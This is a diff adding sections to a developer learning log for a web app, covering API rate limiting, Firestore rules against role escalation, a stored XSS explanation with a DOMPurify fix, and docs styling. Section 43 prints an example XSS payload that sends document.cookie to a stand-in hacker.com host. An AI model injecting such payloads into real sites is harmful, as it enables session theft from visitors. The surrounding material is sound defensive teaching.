@@ -2439,6 +2439,209 @@ We added a "Back to Dashboard" link at the very top of the content area in `Anal
 
 This is about **Navigation Visibility**. A user should never wonder "Where am I?" or "How do I get back?". Explicit navigation trails (breadcrumbs or back buttons) build user confidence.
 
+````
+
+## 41. Deep Dive: Protecting the API (Rate Limiting & Quotas)
+
+**Objective:** We need to stop "free" users from draining our bank account by calling the expensive Google Gemini API millions of times.
+
+### 41.1 The Solution: Server-Side "Iron Dome"
+We moved from a "Client-Side Check" (which hackers can skip) to a "Server-Side Enforcement" (which they cannot skip).
+
+1.  **The New Runtime:** We switched `api/generate.ts` from `edge` to `nodejs`.
+    *   **Why?** The `firebase-admin` SDK needs Node.js. It allows us to hold the "Master Key" (Service Account) safely on the server.
+2.  **The Token Verification:**
+    *   **Client:** Sends `Authorization: Bearer <ID_TOKEN>`.
+    *   **Server:** Verifies this token with Google. If it's fake, we block it (`401 Unauthorized`).
+3.  **The Usage Check:**
+    *   **Server:** Reads the user's `usage` document from Firestore.
+    *   **Logic:**
+        *   If `wordsUsed >= 5000`: STOP. Return `403 Forbidden`.
+        *   If `wordsUsed < 5000`: PROCEED. Call Google.
+    *   **The Cost:** If the call succeeds, we count the words and *atomically increment* the usage in the database.
+
+---
+
+## 42. Deep Dive: Firestore Security Rules (Privilege Escalation)
+
+**Objective:** Understand exactly how we stop users from "hacking" their own profiles to become Admins.
+
+### 42.1 The Code Breakdown
+Here is the line-by-line translation of our "Iron Defense" logic:
+
+```javascript
+match /users/{userId}
+````
+
+**"Only look at User Profiles."** This rule applies specifically to documents inside the `users` collection.
+
+### Phase 1: Creating a Profile (`allow create`)
+
+When a user signs up, they create a document. We must ensure they start clean.
+
+1.  `if request.auth != null`
+
+    - **Translation:** "You must be logged in." Anonymous hackers are blocked instantly.
+
+2.  `&& request.auth.uid == userId`
+
+    - **Translation:** "You can only create YOUR OWN profile." You cannot create a profile for user `xyz`.
+
+3.  `&& (!('role' in request.resource.data) || request.resource.data.role == 'user')`
+
+    - **Translation:** "Check the data you are sending (`request.resource.data`). The `role` field must either be MISSING (default) or strictly set to 'user'."
+    - **Security:** If you try to send `{ role: 'admin' }`, this rule fails, and the database rejects you.
+
+4.  `&& (!('usage' in request.resource.data) || request.resource.data.usage.wordsUsed == 0)`
+    - **Translation:** "The `usage` field must be MISSING or strictly 0."
+    - **Security:** You cannot start your account with `{ usage: { wordsUsed: -99999 } }` (negative usage hack).
+
+### Phase 2: Updating a Profile (`allow update`)
+
+When a user changes their name or photo, we must ensure they don't _sneak in_ a role change.
+
+1.  `request.resource.data.diff(resource.data).affectedKeys()`
+
+    - **Translation:** "Compare the NEW data vs the OLD data. Give me a list of keys that CHANGED."
+
+2.  `.hasAny(['role'])`
+
+    - **Translation:** "Does this list of changed keys contain 'role'?"
+
+3.  `!` (The NOT operator)
+    - **Translation:** "ensure the answer is NO."
+    - **Combined:** "You are allowed to update, BUT ONLY IF you are **NOT** touching the `role` field."
+
+**Summary:** You can change your `displayName`, `photoURL`, or `bio`. But if you try to slip in a `role: 'admin'` update in the same request, the entire request is blocked.
+
+---
+
+## 43. Deep Dive: Stored XSS (Cross-Site Scripting)
+
+**The Vulnerability:** `dangerouslySetInnerHTML`
+You are using a React feature that explicitly says "This is dangerous".
+
+### 43.1 How the Attack Works
+
+1.  **The Attacker:** Finds a way to write into your `blog_posts` collection.
+2.  **The Payload:** They inject a script tag into the content:
+    ```html
+    <img
+      src="x"
+      onerror="fetch('https://hacker.com/steal?cookie='+document.cookie)"
+    />
+    ```
+3.  **The Execution:** React sees `dangerouslySetInnerHTML`. It takes the string above and puts it directly into the page DOM.
+4.  **The Result:** The browser executes the script, stealing cookies or redirecting users.
+
+---
+
+## 44. Implementation Review: The "XSS" Fix (Defense Against Dark Arts)
+
+**User Question:** _"Explain in details what you actually did... as if I am a newbie."_
+
+### 44.1 The Concept: The "Dirty Water" Analogy
+
+Imagine your website is a **Restaurant**.
+
+- **The Database** is the water tank.
+- **The User** is the customer.
+- **The Browser** is the glass.
+
+Normally, _you_ (the owner) fill the tank with clean water. But what if a hacker sneaks in and poisons the tank (injects a malicious script)?
+If you just pour that water directly into the customer's glass, they get sick (hacked).
+
+**What we did:** We installed a **High-Tech Filter** (DOMPurify) right at the tap.
+Even if the tank has poison in it, the filter catches it _before_ it hits the glass. The customer only drinks clean water.
+
+### 44.2 Terminologies Used
+
+1.  **XSS (Cross-Site Scripting):** The act of tricking a website into running code that it shouldn't.
+    - _Stored XSS:_ The code hides in your database (like a landmine) waiting for someone to view it.
+2.  **DOM (Document Object Model):** The browser's internal map of the webpage. React updates the DOM to show your UI.
+3.  **Sanitization:** The process of cleaning data. Removing the "bad stuff" (scripts) while keeping the "good stuff" (bold text, images, links).
+4.  **Payload:** The actual malicious code. Example: `<script>alert('You are hacked')</script>`.
+
+### 44.3 The Code: Line-by-Line
+
+We modified `src/pages/BlogPostPage.tsx`. Here is exactly what is happening:
+
+**Line 1: The Import**
+
+```typescript
+import DOMPurify from "dompurify";
 ```
 
+- **Mentor Note:** This brings our "Filter" tool into the file. `DOMPurify` is a world-famous library used by huge companies to strip out XSS attacks.
+
+**Line 189: The Dangerous Part**
+Before the fix, it looked like this:
+
+```tsx
+dangerouslySetInnerHTML={{ __html: post.content }}
 ```
+
+- **Translation:** "React, I know this is dangerous, but take whatever is in `post.content` and shove it into the webpage."
+- **Risk:** If `post.content` contained a script, React obeyed and ran it.
+
+**The Fix:**
+
+```tsx
+dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
+```
+
+- **Logic:**
+  1.  `post.content`: We take the raw data from the database.
+  2.  `DOMPurify.sanitize(...)`: We pass that raw data into the Filter.
+  3.  **The Magic:** The filter looks at every HTML tag.
+      - ✅ `<b>Hello</b>` -> Safe. Keep it.
+      - ❌ `<script>Bad()</script>` -> **DANGEROUS.** Delete it!
+  4.  The result is a "Clean String".
+  5.  `__html: ...`: We give the Clean String to React.
+
+### 44.4 Why this is "Hacker-Proof" now
+
+You can literally go into your Firebase Database right now and paste this into a blog post body:
+`<h1>Welcome</h1><script>alert('Stealing Cookies')</script>`
+
+- **Before:** The alert would pop up on everyone's screen.
+- **Now:** The user sees "Welcome", and the script is silently deleted. The attack fails 100% of the time.
+
+---
+
+## 45. Deep Dive: Building a Professional Docs Interface
+
+**User Question:** _"How can we further style this docs page... Lead Architect suggestions?"_
+
+### 45.1 The Philosophy: Docs as a Product
+
+Documentation isn't just text; it's a product feature. Users judge the quality of your software by the quality of your documentation.
+A "professional" docs page has three non-negotiable traits:
+
+1.  **Wayfinding:** Users must never feel lost (Breadcrumbs, Sidebar, TOC).
+2.  **Readability:** Typography must be optimized for long-form reading (Font weights, line heights).
+3.  **Engagement:** It shouldn't feel like a static PDF. It should feel alive (Feedback buttons, Edit links).
+
+### 45.2 The Implementation: "Display" vs. "Body" Fonts
+
+We updated `tailwind.config.js` to support a **Dual-Font System**.
+
+- **Body:** `Inter` (Standard, highly readable).
+- **Headings (`font-display`):** `Inter` (but with tighter tracking and heavier weights) or a distinct font like `Outfit`.
+- **Why?** This visual separation creates hierarchy. Your eyes instantly scan the bold headers, skipping the interaction details until needed.
+
+### 45.3 The "On This Page" Component (ScrollSpy)
+
+We created a new component: `OnThisPage.tsx`.
+
+- **The Logic:** It's a "ScrollSpy". It watches your scroll position using the Browser's `IntersectionObserver` API.
+- **The Effect:** As you scroll down reading, the sidebar automatically highlights the current section.
+- **Why it feels Premium:** It gives the user "Location Awareness". They know exactly how much is left to read.
+
+### 45.4 Micro-Interactions
+
+We added small details that make a huge difference:
+
+1.  **Breadcrumbs:** `Docs > Getting Started > Installation`. A clickable trail back home.
+2.  **Feedback Loop:** A simple "Was this helpful?" (👍 / 👎) section. Even if it doesn't send data yet, it signals that you _care_ about quality.
+3.  **Edit on GitHub:** This invites power users to contribute, building a community around your product.
